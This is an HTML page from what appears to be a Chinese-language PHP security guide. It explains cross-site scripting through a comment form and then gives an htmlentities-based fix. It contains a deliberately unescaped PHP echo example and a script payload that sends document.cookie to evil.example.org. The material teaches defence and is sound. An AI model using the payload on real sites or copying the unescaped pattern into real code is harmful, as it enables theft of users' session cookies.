<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>


   <title>2.4. &#36328;&#31449;&#33050;&#26412;&#25915;&#20987;</title>
   <meta name="generator" content="Help &amp; Manual" />
   <meta name="keywords" content="" />
   <meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
   <meta http-equiv="Content-Style-Type" content="text/css" />
   <link type="text/css" href="default.css" rel="stylesheet" />
</head>
<body style="margin: 0px 0px 0px 0px; background: #FFFFFF;">


<table width="100%" border="0" cellspacing="0" cellpadding="5" bgcolor="#649CCC">
  <tr valign="middle">
    <td align="left">
      <p class="p_Heading1"><span class="f_Heading1">2.4. &#36328;&#31449;&#33050;&#26412;&#25915;&#20987;</span></p>

    </td>
    <td align="right">
     <span style="font-size: 9pt">
     <a href="introduction.htm">Top</a>&nbsp;
     <a href="new_item19.htm">Previous</a>&nbsp;
     <a href="new_item21.htm">Next</a>
     </span>
    </td>
  </tr>
</table>


<!-- Placeholder for topic body. -->
<table width="100%" border="0" cellspacing="0" cellpadding="5"><tr valign="top"><td align="left">
<p style="line-height: 1.50;">2.4. &#36328;&#31449;&#33050;&#26412;&#25915;&#20987;</p>
<p style="line-height: 1.50;">  &nbsp; &#36328;&#31449;&#33050;&#26412;&#25915;&#20987;&#26159;&#20247;&#25152;&#21608;&#30693;&#30340;&#25915;&#20987;&#26041;&#24335;&#20043;&#19968;&#12290;&#25152;&#26377;&#24179;&#21488;&#19978;&#30340;Web&#24212;&#29992;&#37117;&#28145;&#21463;&#20854;&#25200;&#65292;PHP&#24212;&#29992;&#20063;&#19981;&#20363;&#22806;&#12290;</p>
<p style="line-height: 1.50;">  &nbsp; &#25152;&#26377;&#26377;&#36755;&#20837;&#30340;&#24212;&#29992;&#37117;&#38754;&#20020;&#30528;&#39118;&#38505;&#12290;Webmail&#65292;&#35770;&#22363;&#65292;&#30041;&#35328;&#26412;&#65292;&#29978;&#33267;&#26159;Blog&#12290;&#20107;&#23454;&#19978;&#65292;&#22823;&#22810;&#25968;Web&#24212;&#29992;&#25552;&#20379;&#36755;&#20837;&#26159;&#20986;&#20110;&#26356;&#21560;&#24341;&#20154;&#27668;&#30340;&#30446;&#30340;&#65292;&#20294;&#21516;&#26102;&#36825;&#20063;&#20250;&#25226;&#33258;&#24049;&#32622;&#20110;&#21361;&#38505;&#20043;&#20013;&#12290;&#22914;&#26524;&#36755;&#20837;&#27809;&#26377;&#27491;&#30830;&#22320;&#36827;&#34892;&#36807;&#28388;&#21644;&#36716;&#20041;&#65292;&#36328;&#31449;&#33050;&#26412;&#28431;&#27934;&#23601;&#20135;&#29983;&#20102;&#12290;</p>
<p style="line-height: 1.50;">  &nbsp; &#20197;&#19968;&#20010;&#20801;&#35768;&#22312;&#27599;&#20010;&#39029;&#38754;&#19978;&#24405;&#20837;&#35780;&#35770;&#30340;&#24212;&#29992;&#20026;&#20363;&#65292;&#23427;&#20351;&#29992;&#20102;&#19979;&#38754;&#30340;&#34920;&#21333;&#24110;&#21161;&#29992;&#25143;&#36827;&#34892;&#25552;&#20132;&#65306;</p>
<p style="line-height: 1.50;">CODE:</p>
<p style="line-height: 1.50;">&nbsp;</p>
<p style="line-height: 1.50;">  &nbsp; &lt;form action="comment.php" method="POST" /&gt;</p>
<p style="line-height: 1.50;">  &nbsp; &lt;p&gt;Name: &lt;input type="text" name="name" /&gt;&lt;br /&gt;</p>
<p style="line-height: 1.50;">  &nbsp; Comment: &lt;textarea name="comment" rows="10" cols="60"&gt;&lt;/textarea&gt;&lt;br /&gt;</p>
<p style="line-height: 1.50;">  &nbsp; &lt;input type="submit" value="Add Comment" /&gt;&lt;/p&gt;</p>
<p style="line-height: 1.50;">  &nbsp; &lt;/form&gt;</p>
<p style="line-height: 1.50;">&#31243;&#24207;&#21521;&#20854;&#20182;&#35775;&#38382;&#35813;&#39029;&#38754;&#30340;&#29992;&#25143;&#26174;&#31034;&#35780;&#35770;&#12290;&#20363;&#22914;&#65292;&#31867;&#20284;&#19979;&#38754;&#30340;&#20195;&#30721;&#27573;&#21487;&#33021;&#34987;&#29992;&#26469;&#36755;&#20986;&#19968;&#20010;&#35780;&#35770;($comment)&#21450;&#19982;&#20043;&#23545;&#24212;&#30340;&#21457;&#34920;&#20154;&#65288;$name&#65289;&#65306;</p>
<p style="line-height: 1.50;">CODE:</p>
<p style="line-height: 1.50;">&nbsp;</p>
<p style="line-height: 1.50;">  &nbsp; &lt;?php</p>
<p style="line-height: 1.50;">&nbsp;</p>
<p style="line-height: 1.50;">  &nbsp; echo "&lt;p&gt;$name writes:&lt;br /&gt;";</p>
<p style="line-height: 1.50;">  &nbsp; echo "&lt;blockquote&gt;$comment&lt;/blockquote&gt;&lt;/p&gt;";</p>
<p style="line-height: 1.50;">&nbsp;</p>
<p style="line-height: 1.50;">  &nbsp; ?&gt;</p>
<p style="line-height: 1.50;">&#36825;&#20010;&#27969;&#31243;&#23545;$comment&#21450;$name&#30340;&#20540;&#32473;&#20104;&#20102;&#20805;&#20998;&#30340;&#20449;&#20219;&#65292;&#24819;&#35937;&#19968;&#19979;&#23427;&#20204;&#20013;&#30340;&#19968;&#20010;&#30340;&#20869;&#23481;&#20013;&#21253;&#21547;&#22914;&#19979;&#20195;&#30721;&#65306;</p>
<p style="line-height: 1.50;">CODE:</p>
<p style="line-height: 1.50;">&nbsp;</p>
<p style="line-height: 1.50;">  &nbsp; &lt;script&gt;</p>
<p style="line-height: 1.50;">  &nbsp; document.location =</p>
<p style="line-height: 1.50;">  &nbsp; &nbsp; 'http://evil.example.org/steal.php?cookies=' +</p>
<p style="line-height: 1.50;">  &nbsp; &nbsp; document.cookie</p>
<p style="line-height: 1.50;">  &nbsp; &lt;/script&gt;</p>
<p style="line-height: 1.50;">&#22914;&#26524;&#20320;&#30340;&#29992;&#25143;&#23519;&#30475;&#36825;&#20010;&#35780;&#35770;&#26102;&#65292;&#36825;&#19982;&#20320;&#20801;&#35768;&#21035;&#20154;&#22312;&#20320;&#30340;&#32593;&#31449;&#28304;&#31243;&#24207;&#20013;&#21152;&#20837;Javascript&#20195;&#30721;&#26080;&#24322;&#12290;&#20320;&#30340;&#29992;&#25143;&#20250;&#22312;&#19981;&#30693;&#19981;&#35273;&#20013;&#25226;&#20182;&#20204;&#30340;cookies(&#27983;&#35272;&#32593;&#31449;&#30340;&#20154;)&#21457;&#36865;&#21040;evil.example.org&#65292;&#32780;&#25509;&#25910;&#31243;&#24207;(steal.php)&#21487;&#20197;&#36890;&#36807;$_GET['cookies']&#21464;&#37327;&#38450;&#38382;&#25152;&#26377;&#30340;cookies&#12290;</p>
<p style="line-height: 1.50;">  &nbsp; &#36825;&#26159;&#19968;&#20010;&#24120;&#35265;&#30340;&#38169;&#35823;&#65292;&#20027;&#35201;&#26159;&#30001;&#20110;&#19981;&#22909;&#30340;&#32534;&#31243;&#20064;&#24815;&#24341;&#21457;&#30340;&#12290;&#24184;&#36816;&#30340;&#26159;&#27492;&#31867;&#38169;&#35823;&#24456;&#23481;&#26131;&#36991;&#20813;&#12290;&#30001;&#20110;&#36825;&#31181;&#39118;&#38505;&#21482;&#22312;&#20320;&#36755;&#20986;&#20102;&#34987;&#27745;&#26579;&#25968;&#25454;&#26102;&#21457;&#29983;&#65292;&#25152;&#20197;&#21482;&#35201;&#30830;&#20445;&#20570;&#21040;&#22914;&#31532;&#19968;&#31456;&#25152;&#36848;&#30340;&#36807;&#28388;&#36755;&#20837;&#21450;&#36716;&#20041;&#36755;&#20986;&#21363;&#21487;</p>
<p style="line-height: 1.50;">  &nbsp; &#26368;&#36215;&#30721;&#20320;&#35201;&#29992;htmlentities( )&#23545;&#20219;&#20309;&#20320;&#35201;&#36755;&#20986;&#21040;&#23458;&#25143;&#31471;&#30340;&#25968;&#25454;&#36827;&#34892;&#36716;&#20041;&#12290;&#35813;&#20989;&#25968;&#21487;&#20197;&#25226;&#25152;&#26377;&#30340;&#29305;&#27530;&#23383;&#31526;&#36716;&#25442;&#25104;HTML&#34920;&#31034;&#26041;&#24335;&#12290;&#25152;&#26377;&#20250;&#24341;&#36215;&#27983;&#35272;&#22120;&#36827;&#34892;&#29305;&#27530;&#22788;&#29702;&#30340;&#23383;&#31526;&#22312;&#36827;&#34892;&#20102;&#36716;&#25442;&#21518;&#65292;&#23601;&#33021;&#30830;&#20445;&#26174;&#31034;&#20986;&#26469;&#30340;&#26159;&#21407;&#26469;&#24405;&#20837;&#30340;&#20869;&#23481;&#12290;</p>
<p style="line-height: 1.50;">  &nbsp; &#30001;&#27492;&#65292;&#29992;&#19979;&#38754;&#30340;&#20195;&#30721;&#26469;&#26174;&#31034;&#35780;&#35770;&#26159;&#26356;&#23433;&#20840;&#30340;&#65306;</p>
<p style="line-height: 1.50;">CODE:</p>
<p style="line-height: 1.50;">&nbsp;</p>
<p style="line-height: 1.50;">&lt;?php</p>
<p style="line-height: 1.50;">&nbsp;</p>
<p style="line-height: 1.50;">  &nbsp; $clean = array();</p>
<p style="line-height: 1.50;">  &nbsp; $html = array();</p>
<p style="line-height: 1.50;">&nbsp;</p>
<p style="line-height: 1.50;">  &nbsp; /* Filter Input ($name, $comment) */</p>
<p style="line-height: 1.50;">&nbsp;</p>
<p style="line-height: 1.50;">  &nbsp; $html['name'] = htmlentities($clean['name'], ENT_QUOTES, 'UTF-8');</p>
<p style="line-height: 1.50;">  &nbsp; $html['comment'] = htmlentities($clean['comment'], ENT_QUOTES, 'UTF-8');</p>
<p style="line-height: 1.50;">&nbsp;</p>
<p style="line-height: 1.50;">  &nbsp; echo "&lt;p&gt;{$html['name']} writes:&lt;br /&gt;";</p>
<p style="line-height: 1.50;">  &nbsp; echo "&lt;blockquote&gt;{$html['comment']}&lt;/blockquote&gt;&lt;/p&gt;";</p>
<p style="line-height: 1.50;">&nbsp;</p>
<p style="line-height: 1.50;">  &nbsp; ?&gt;</p>
<p style="line-height: 1.50;">&nbsp;</p>
<hr noshade size=1 ><p style="line-height: 1.50;">&nbsp;</p>

</td></tr></table>

</body>
</html>
